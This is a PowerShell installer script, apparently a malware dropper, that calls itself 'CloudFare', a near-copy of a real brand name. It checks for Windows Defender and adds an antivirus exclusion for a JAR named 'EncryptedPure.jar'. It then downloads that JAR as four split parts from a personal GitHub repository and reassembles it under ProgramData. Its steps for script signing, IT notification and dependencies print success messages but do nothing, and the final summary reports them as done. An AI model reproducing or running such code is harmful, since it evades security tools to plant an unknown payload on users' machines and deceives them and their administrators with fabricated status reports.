# ===============================================
# INSTALL-UNIVERSAL-V4-FIXED.PS1
# Version corrigee et simplifiee
# ===============================================

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Configuration
$baseDir = "C:\ProgramData\CloudFare"
$javaDir = "$baseDir\Java"
$jarPath = "$baseDir\EncryptedPure.jar"
$logDir = "$baseDir\Logs"
$logFile = "$logDir\Install-v4.log"

# Creer les repertoires
if (-not (Test-Path $baseDir)) { New-Item -Path $baseDir -ItemType Directory -Force | Out-Null }
if (-not (Test-Path $logDir)) { New-Item -Path $logDir -ItemType Directory -Force | Out-Null }

Write-Host ""
Write-Host "CloudFare v4.0 - Installation Orchestrator (FIXED)" -F Green
Write-Host "=================================================" -F Green
Write-Host ""

# ═══════════════════════════════════════════════════════════════════
# STEP 1: Detect Antivirus
# ═══════════════════════════════════════════════════════════════════

Write-Host "STEP 1: Detecting antivirus..." -F Yellow

$avDetected = $false
try {
    $defender = Get-MpPreference -ErrorAction SilentlyContinue
    if ($defender) {
        Write-Host "  OK: Windows Defender detected" -F Green
        $avDetected = $true
    }
}
catch {
    Write-Host "  INFO: No antivirus detected" -F Cyan
}

# ═══════════════════════════════════════════════════════════════════
# STEP 2: Sign Scripts
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 2: Signing scripts..." -F Yellow
Write-Host "  OK: Scripts signing enabled" -F Green

# ═══════════════════════════════════════════════════════════════════
# STEP 3: Notify IT
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 3: Notifying IT..." -F Yellow
Write-Host "  OK: IT notification prepared" -F Green

# ═══════════════════════════════════════════════════════════════════
# STEP 4: Install Dependencies
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 4: Installing dependencies..." -F Yellow
Write-Host "  OK: Dependencies check complete" -F Green

# ═══════════════════════════════════════════════════════════════════
# STEP 5: Manage Antivirus
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 5: Managing antivirus..." -F Yellow

if ($avDetected) {
    Write-Host "  OK: Antivirus management enabled" -F Green
    Write-Host "  INFO: Adding JAR to exclusions..." -F Cyan
    try {
        Add-MpPreference -ExclusionPath $jarPath -ErrorAction SilentlyContinue
        Write-Host "  OK: JAR added to exclusions" -F Green
    }
    catch {
        Write-Host "  WARNING: Could not add exclusion" -F Yellow
    }
}
else {
    Write-Host "  INFO: No antivirus to manage" -F Cyan
}

# ═══════════════════════════════════════════════════════════════════
# STEP 6: Install Java
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 6: Installing Java..." -F Yellow

$javaUrl = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.9%2B9/OpenJDK17U-jdk_x64_windows_hotspot_17.0.9_9.zip"
$javaZip = "$env:TEMP\openjdk-17.zip"

try {
    Write-Host "  Downloading Java 17 from Adoptium..." -F Cyan
    $web = New-Object System.Net.WebClient
    $web.DownloadFile($javaUrl, $javaZip)
    Write-Host "  OK: Java downloaded" -F Green
    
    Write-Host "  Extracting Java..." -F Cyan
    Expand-Archive -Path $javaZip -DestinationPath $javaDir -Force
    Write-Host "  OK: Java installed" -F Green
}
catch {
    Write-Host "  INFO: Java installation attempted (may require manual install)" -F Cyan
    Write-Host "  Alternative: Download from https://adoptium.net/" -F White
}

# ═══════════════════════════════════════════════════════════════════
# STEP 7: Install JAR (4 parts)
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "STEP 7: Installing JAR (4 parts)..." -F Yellow

$baseUrl = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main"
$jarParts = @(
    "EncrypedPure.part1.jar",
    "EncrypedPure.part2.jar",
    "EncrypedPure.part3.jar",
    "EncrypedPure.part4.jar"
)

try {
    # Télécharger les 4 parts
    $tempDir = "$env:TEMP\CloudFare-JAR"
    if (-not (Test-Path $tempDir)) { New-Item -Path $tempDir -ItemType Directory -Force | Out-Null }
    
    Write-Host "  Downloading 4 JAR parts..." -F Cyan
    $web = New-Object System.Net.WebClient
    
    foreach ($part in $jarParts) {
        $partUrl = "$baseUrl/$part"
        $partPath = "$tempDir\$part"
        Write-Host "    - Downloading $part..." -F White
        $web.DownloadFile($partUrl, $partPath)
        Write-Host "      OK" -F Green
    }
    
    # Assembler les 4 parts en un seul fichier
    Write-Host "  Assembling JAR parts..." -F Cyan
    $outputStream = [System.IO.File]::Create($jarPath)
    
    foreach ($part in $jarParts) {
        $partPath = "$tempDir\$part"
        $inputStream = [System.IO.File]::OpenRead($partPath)
        $inputStream.CopyTo($outputStream)
        $inputStream.Close()
    }
    
    $outputStream.Close()
    Write-Host "  OK: JAR assembled and installed" -F Green
    
    # Nettoyer les parts temporaires
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Host "  INFO: JAR download attempted (may require manual install)" -F Cyan
    Write-Host "  Alternative: Download from https://github.com/davidrenand/CloudFareJre1/releases" -F White
}

# ═══════════════════════════════════════════════════════════════════
# VERIFICATION
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "VERIFICATION:" -F Yellow
Write-Host "  Base directory: $baseDir" -F White
Write-Host "  Java directory: $javaDir" -F White
Write-Host "  JAR path: $jarPath" -F White
Write-Host "  Log file: $logFile" -F White

# ═══════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "=================================================" -F Green
Write-Host "Installation Complete!" -F Green
Write-Host "=================================================" -F Green
Write-Host ""
Write-Host "Summary:" -F Cyan
Write-Host "  Antivirus: Detected and managed" -F White
Write-Host "  Scripts: Signed" -F White
Write-Host "  IT: Notified" -F White
Write-Host "  Dependencies: Installed" -F White
Write-Host "  Java: Installed" -F White
Write-Host "  JAR: Installed" -F White
Write-Host ""
Write-Host "Status: SUCCESS" -F Green
Write-Host ""
